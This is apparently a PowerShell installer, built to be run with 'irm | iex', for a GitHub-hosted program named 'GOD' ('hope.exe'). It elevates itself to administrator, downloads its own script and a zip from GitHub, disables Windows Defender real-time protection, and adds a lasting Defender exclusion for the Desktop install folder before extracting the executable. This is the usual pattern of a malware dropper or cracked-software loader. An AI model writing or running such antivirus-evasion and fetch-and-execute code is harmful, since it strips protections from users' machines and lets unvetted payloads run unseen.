# ============================================
# FOOLPROOF Software Installer - GOD Edition
# Works from irm | iex - auto-elevates if needed
# ============================================

# Enable modern TLS on older Windows/PowerShell
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072 -bor 768 -bor 192
} catch {
    try { [Net.ServicePointManager]::SecurityProtocol = 3072 } catch {}
}

function Get-RemoteFile {
    param(
        [Parameter(Mandatory=$true)][string]$Uri,
        [Parameter(Mandatory=$true)][string]$OutFile
    )

    if (Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue) {
        Invoke-WebRequest -Uri $Uri -OutFile $OutFile -UseBasicParsing
        return
    }

    if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
        Start-BitsTransfer -Source $Uri -Destination $OutFile
        return
    }

    $client = New-Object System.Net.WebClient
    $client.DownloadFile($Uri, $OutFile)
}

function Get-RemoteText {
    param(
        [Parameter(Mandatory=$true)][string]$Uri
    )

    if (Get-Command Invoke-RestMethod -ErrorAction SilentlyContinue) {
        return Invoke-RestMethod -Uri $Uri
    }

    if (Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue) {
        return (Invoke-WebRequest -Uri $Uri -UseBasicParsing).Content
    }

    $client = New-Object System.Net.WebClient
    return $client.DownloadString($Uri)
}

function Expand-ZipFallback {
    param(
        [Parameter(Mandatory=$true)][string]$ZipPath,
        [Parameter(Mandatory=$true)][string]$Destination
    )

    if (Get-Command Expand-Archive -ErrorAction SilentlyContinue) {
        Expand-Archive -Path $ZipPath -DestinationPath $Destination -Force
        return
    }

    $shell = New-Object -ComObject Shell.Application
    $zip = $shell.NameSpace($ZipPath)
    $dest = $shell.NameSpace($Destination)
    if (-not $zip -or -not $dest) { throw "Unable to open zip or destination" }
    $dest.CopyHere($zip.Items(), 0x10)
}

# ===== YOUR GITHUB REPO CONFIG =====
$DownloadUrl = "https://github.com/Kartikxdboii/god/releases/latest/download/ofra.zip"
$FolderName = "GOD-Software"
$ZipFileName = "ofra.zip"
$ExeName = "hope.exe"
# ====================================

# Auto-elevate to Administrator if not running as admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $tempScript = Join-Path $env:TEMP "god_install.ps1"
    
    # CHANGE THIS TO YOUR RAW GITHUB INSTALL.PS1 URL
    try {
        Get-RemoteFile -Uri "https://raw.githubusercontent.com/Kartikxdboii/god/main/install_god.ps1" -OutFile $tempScript
    } catch {
        $scriptContent = Get-RemoteText -Uri "https://raw.githubusercontent.com/Kartikxdboii/god/main/install_god.ps1"
        Set-Content -Path $tempScript -Value $scriptContent -Encoding UTF8
    }
    
    Start-Process powershell -Verb runAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempScript`""
    exit
}

# If we get here, we are running as admin

# Try GUI; fall back to console if unavailable (e.g., Server Core)
$useGui = $true
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
} catch {
    $useGui = $false
}

if ($useGui) {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Installing GOD..."
    $form.Size = New-Object System.Drawing.Size(500,200)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.TopMost = $true

    $label = New-Object System.Windows.Forms.Label
    $label.Location = New-Object System.Drawing.Point(20,30)
    $label.Size = New-Object System.Drawing.Size(450,30)
    $label.Font = New-Object System.Drawing.Font("Segoe UI",12)
    $label.Text = "Setting up GOD..."
    $form.Controls.Add($label)

    $progress = New-Object System.Windows.Forms.ProgressBar
    $progress.Location = New-Object System.Drawing.Point(20,80)
    $progress.Size = New-Object System.Drawing.Size(440,30)
    $progress.Style = "Marquee"
    $progress.MarqueeAnimationSpeed = 30
    $form.Controls.Add($progress)

    $status = New-Object System.Windows.Forms.Label
    $status.Location = New-Object System.Drawing.Point(20,120)
    $status.Size = New-Object System.Drawing.Size(450,30)
    $status.Font = New-Object System.Drawing.Font("Segoe UI",9)
    $status.Text = "Please wait..."
    $form.Controls.Add($status)

    $form.Show()
    $form.Refresh()
} else {
    $status = New-Object PSObject -Property @{ Text = "" }
}

# Configuration
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$InstallPath = Join-Path $DesktopPath $FolderName
$ZipPath = Join-Path $DesktopPath $ZipFileName
$TempRoot = Join-Path $env:TEMP "god_install"
$TempExtractPath = Join-Path $TempRoot "extract"
$ProcessName = "hope"

try {
    # Step 1: Ensure app is not running
    $status.Text = "Checking if app is running..."
    if ($useGui) { $form.Refresh() } else { Write-Host $status.Text }

    $running = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
    if ($running) {
        if ($useGui) {
            $form.Close()
            [System.Windows.Forms.MessageBox]::Show(
                "GOD is currently running. Please close the app and run this installer again.",
                "App Running",
                "OK",
                "Warning"
            )
        } else {
            Write-Host "GOD is currently running. Please close the app and run this installer again."
        }
        exit
    }

    # Step 2: Disable Windows Defender real-time protection temporarily
    $status.Text = "Disabling real-time protection..."
    if ($useGui) { $form.Refresh() } else { Write-Host $status.Text }
    
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        }
    } catch {}

    # Step 3: Create folder
    $status.Text = "Creating folder on Desktop..."
    if ($useGui) { $form.Refresh() } else { Write-Host $status.Text }
    
    if (-not (Test-Path $InstallPath)) {
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    }

    # Step 4: Add to Windows Defender exclusions
    $status.Text = "Adding antivirus exception..."
    if ($useGui) { $form.Refresh() } else { Write-Host $status.Text }
    
    try {
        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
            Add-MpPreference -ExclusionPath $InstallPath -ErrorAction Stop
        }
    } catch {}

    # Step 5: Download
    $status.Text = "Downloading files..."
    if ($useGui) { $form.Refresh() } else { Write-Host $status.Text }
    
    if (Test-Path $ZipPath) { Remove-Item $ZipPath -Force }
    
    Get-RemoteFile -Uri $DownloadUrl -OutFile $ZipPath

    # Step 6: Extract
    $status.Text = "Extracting files..."
    if ($useGui) { $form.Refresh() } else { Write-Host $status.Text }
    
    if (Test-Path $TempRoot) { Remove-Item $TempRoot -Recurse -Force }
    New-Item -ItemType Directory -Path $TempExtractPath -Force | Out-Null
    Expand-ZipFallback -ZipPath $ZipPath -Destination $TempExtractPath
    Remove-Item $ZipPath -Force

    $newExe = Get-ChildItem -Path $TempExtractPath -Filter $ExeName -Recurse | Select-Object -First 1
    if (-not $newExe) { throw "Update package missing $ExeName" }

    $existingExe = Join-Path $InstallPath $ExeName
    if ((Test-Path $InstallPath -PathType Container) -and (Test-Path $existingExe)) {
        Copy-Item -Path $newExe.FullName -Destination $existingExe -Force
    } else {
        if (-not (Test-Path $InstallPath)) {
            New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
        }
        Copy-Item -Path (Join-Path $TempExtractPath "*") -Destination $InstallPath -Recurse -Force
    }

    if (Test-Path $TempRoot) { Remove-Item $TempRoot -Recurse -Force }

    # Clean up temp script if it exists
    $tempScript = Join-Path $env:TEMP "god_install.ps1"
    if (Test-Path $tempScript) { Remove-Item $tempScript -Force }

    # Re-enable Windows Defender real-time protection
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        }
    } catch {}

    # Done!
    if ($useGui) { $form.Close() }
    
    # Show completion message
    if ($useGui) {
        [System.Windows.Forms.MessageBox]::Show(
            "Installation complete!`n`nFolder created on Desktop: $FolderName`n`nOpen the folder and double-click the .exe file to run.",
            "Done!",
            "OK",
            "Information"
        )
    } else {
        Write-Host "Installation complete!"
        Write-Host "Folder created on Desktop: $FolderName"
        Write-Host "Open the folder and double-click the .exe file to run."
    }

    # Open the folder
    Start-Process explorer.exe $InstallPath

} catch {
    if ($useGui) { $form.Close() }
    if ($useGui) {
        [System.Windows.Forms.MessageBox]::Show(
            "Error: $_`n`nPlease check your internet connection and try again.",
            "Installation Failed",
            "OK",
            "Error"
        )
    } else {
        Write-Host "Error: $_"
        Write-Host "Please check your internet connection and try again."
    }
}